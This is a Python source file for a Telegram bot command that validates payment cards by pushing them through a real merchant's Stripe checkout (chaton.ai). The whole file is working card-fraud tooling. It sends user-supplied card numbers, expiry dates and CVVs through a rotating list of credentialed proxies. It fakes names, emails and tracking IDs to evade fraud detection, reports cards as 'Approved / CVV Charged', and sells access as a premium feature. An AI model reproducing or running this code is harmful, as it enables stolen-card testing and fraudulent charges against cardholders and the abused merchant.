import time
import re
import aiohttp
import asyncio
import requests
import random
import string
import traceback
from EQUROBOT import app
from EQUROBOT.core.mongo import has_premium_access
from pyrogram import Client, filters
from fake_useragent import UserAgent
from requests.exceptions import RequestException, Timeout
from collections import defaultdict
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from config import OWNER_ID

user_request_times = defaultdict(list)




async def get_bin_info(bin_number):
    url = f"https://bins.antipublic.cc/bins/{bin_number}"
    connector = aiohttp.TCPConnector(ssl=False)

    async with aiohttp.ClientSession(connector=connector) as session:
        try:
            async with session.get(url) as response:
                if response.status == 200:
                    bin_info = await response.json()
                    return (
                        bin_info.get("brand", "N/A"),
                        bin_info.get("type", "N/A"),
                        bin_info.get("level", "N/A"),
                        bin_info.get("bank", "N/A"),
                        bin_info.get("country_name", "N/A"),
                        bin_info.get("country_flag", ""),
                    )
                else:
                    return "Error fetching BIN info", "N/A", "N/A", "N/A", "N/A", "N/A"
        except aiohttp.ClientError:
            return "Error parsing BIN info", "N/A", "N/A", "N/A", "N/A", "N/A"


user_agent = UserAgent()
user = user_agent.random

first_names = [
    "JAMES", "JOHN", "ROBERT", "MICHAEL", "WILLIAM", "DAVID",
    "RICHARD", "CHARLES", "JOSEPH", "THOMAS", "CHRISTOPHER",
    "DANIEL", "PAUL", "MARK", "DONALD", "GEORGE", "MIKE", "STANLEY"
]

last_names = [
    "SMITH", "JOHNSON", "WILLIAMS", "JONES", "BROWN", "DAVIS",
    "MILLER", "WILSON", "MOORE", "TAYLOR", "ANDERSON", "THOMAS"
]

def generate_random_name():
    first_name = random.choice(first_names)
    last_name = random.choice(last_names)
    return f"{first_name} {last_name}"


def generate_number():
    return int("".join([str(random.randint(0, 9)) for _ in range(15)]))


def generate_fb_id():
    prefix = "fb.1."
    first_number = "".join(
        [str(random.randint(0, 9)) for _ in range(random.randint(13, 14))]
    )
    second_number = "".join([str(random.randint(0, 9)) for _ in range(18)])
    return prefix + first_number + "." + second_number


def generate_ten_digit_number():
    return int("".join([str(random.randint(0, 9)) for _ in range(10)]))


def generate_two_part_number():
    first_part = "".join([str(random.randint(0, 9)) for _ in range(9)])
    second_part = "".join([str(random.randint(0, 9)) for _ in range(10)])
    return f"{first_part}.{second_part}"


def generate_complex_id():
    def random_hex_string(length):
        return "".join(random.choice(string.hexdigits.lower()) for _ in range(length))

    part1 = random_hex_string(8)
    part2 = random_hex_string(4)
    part3 = random_hex_string(4)
    part4 = random_hex_string(4)
    part5 = random_hex_string(24)
    return f"{part1}-{part2}-{part3}-{part4}-{part5}"


def generate_complex_id_with_extra():
    def random_hex_string(length):
        return "".join(random.choice(string.hexdigits.lower()) for _ in range(length))

    part1 = random_hex_string(8)
    part2 = random_hex_string(4)
    part3 = random_hex_string(4)
    part4 = random_hex_string(4)
    part5 = random_hex_string(12)
    extra_part = random_hex_string(8)
    return f"{part1}-{part2}-{part3}-{part4}-{part5}{extra_part}"


def generate_custom_id():
    def random_hex_string(length):
        return "".join(random.choice(string.hexdigits.lower()) for _ in range(length))

    part1 = random_hex_string(8)
    part2 = random_hex_string(4)
    part3 = random_hex_string(4)
    part4 = random_hex_string(4)
    part5 = random_hex_string(12)
    extra_part = random_hex_string(7)
    return f"{part1}-{part2}-{part3}-{part4}-{part5}{extra_part}"


def generate_64_hex_string():
    return "".join(random.choice(string.hexdigits.upper()) for _ in range(64))


def generate_random_email():
    username = "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
    domain = random.choice(["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"])
    return f"{username}@{domain}"


def generate_random_user_id():
    return "".join(random.choices(string.ascii_letters + string.digits, k=21))


email = generate_random_email()
user_id = generate_random_user_id()

proxy_list = [
    "http://tickets:proxyon145@107.172.229.182:12345",
    "http://tickets:proxyon145@104.160.17.116:12345",
    "http://tickets:proxyon145@198.46.172.86:12345",
    "http://tickets:proxyon145@50.3.137.165:12345",
    "http://tickets:proxyon145@162.212.170.77:12345",
    "http://tickets:proxyon145@23.94.251.43:12345",
    "http://tickets:proxyon145@162.212.170.252:12345",
    "http://tickets:proxyon145@104.206.81.209:12345",
    "http://tickets:proxyon145@23.104.162.39:12345",
    "http://tickets:proxyon145@192.227.241.115:12345",
]


async def check_card(card_info, message):
    card = card_info.split("|")
    if len(card) != 4 or not all(card):
        return "Invalid card details. Please use the format: card_number|mm|yy|cvv"

    cc, mm, yy, cvv = card
    start_time = time.time()

    proxy = random.choice(proxy_list)
    proxies = {"http": proxy, "https": proxy}

    stripe_url = "https://api.stripe.com/v1/tokens"

    stripe_headers = {
        "authority": "api.stripe.com",
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "sec-ch-ua": '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": user,
    }

    stripe_data = {
        "guid": generate_complex_id(),
        "muid": generate_complex_id_with_extra(),
        "sid": generate_custom_id(),
        "referrer": "https://chaton.ai",
        "time_on_page": "416544",
        "card[name]": generate_random_name(),
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_month]": mm,
        "card[exp_year]": yy,
        "payment_user_agent": "stripe.js/883a2ae1fb; stripe-js-v3/883a2ae1fb; split-card-element",
        "pasted_fields": "number",
        "key": "pk_live_51OFuqbJI5eePoNHYcArch2y62M97lkY2aKMcQbz8dnPUI27KX31LELyGkhWUJG9Jo8cwVLdrXj07KQQ1YXm4Sqyv00iW4AshPu",
    }

    try:
        response = requests.post(
            stripe_url, headers=stripe_headers, data=stripe_data, proxies=proxies
        )
        if response.status_code == 200:
            token = response.json().get("id")
        else:
            return f"Failed to get token. Status code: {response.status_code}, Response: {response.text}"

        chaton_url = "https://pa.aiby.mobi/api/v1.0/chatonweb/checkout_card"
        chaton_headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Origin": "https://chaton.ai",
            "Referer": "https://chaton.ai/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "cross-site",
            "User-Agent": user,
            "sec-ch-ua": '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
        }
        chaton_data = {
            "application": "chaton-web",
            "product_id": "prod_PVV6Gq8gidk9Qy",
            "email": email,
            "user_id": user_id,
            "token": token,
            "external_id": generate_64_hex_string(),
            "fbp": generate_fb_id(),
            "pixel_id": generate_number(),
            "ga_params": {
                "session_id": generate_ten_digit_number(),
                "client_id": generate_two_part_number(),
            },
        }

        chaton_response = requests.post(
            chaton_url, headers=chaton_headers, json=chaton_data, proxies=proxies
        )
        response_text = chaton_response.text

        if "Card declined" in response_text:
            status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
            resp = "Your card was declined."
        elif "customer_id" in response_text and "subscription_id" in response_text:
            status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱✅"
            resp = "CVV Charged"
        else:
            status = "Unknown"
            resp = "No valid response received."

        brand, card_type, level, bank, country, flag = await get_bin_info(cc[:6])

        execution_time = time.time() - start_time

        final_response = (
            f"{status}\n\n"
            f"𝗖𝗮𝗿𝗱 ⇾ `{cc}|{mm}|{yy}|{cvv}`\n"
            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Sitebased\n"
            f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {resp}\n\n"
            f"𝗜𝗻𝗳𝗼 ⇾ {brand} - {card_type} - {level}\n"
            f"𝗜𝘀𝘀𝘂𝗲𝗿 ⇾ {bank} 🏛\n"
            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⇾ {country} {flag}\n\n"
            f"𝗧𝗶𝗺𝗲 ⇾ {execution_time:.2f} **Seconds**\n"
            f"𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ⇾ [{message.from_user.first_name}](tg://user?id={message.from_user.id})"
        )
        return final_response
    except (RequestException, Timeout):
        traceback.print_exc()
        return "Error processing the request."





card_pattern = re.compile(r"(\d{15,16})[|/:](\d{2})[|/:](\d{2,4})[|/:](\d{3,4})")


@app.on_message(filters.command("svv", prefixes=[".", "/", "!"]))
async def handle_check_card(client, message):
    user_id = message.from_user.id

    if not await has_premium_access(message.from_user.id) and message.from_user.id != OWNER_ID:
        return await message.reply_text("You don't have premium access. Contact my owner to purchase premium.")

    if not allowed:
        await message.reply(
            f"🚫 **Anti-Spam** Detected! Please try again after {remaining_time} seconds."
        )
        return

    try:
        card_info = message.text.split(maxsplit=1)[1].strip()
    except IndexError:
        await message.reply(
            "Please provide the card details in the format: `card_number|mm|yy|cvv`"
        )
        return

    if not card_pattern.fullmatch(card_info):
        await message.reply(
            "Please provide the card details in the format: `card_number|mm|yy|cvv`."
        )
        return

    processing_msg = await message.reply("Processing your request...")

    try:
        response = await check_card(card_info, message)
        await processing_msg.edit_text(response)
    except Exception as e:
        await processing_msg.edit_text(f"An error occurred: {str(e)}")
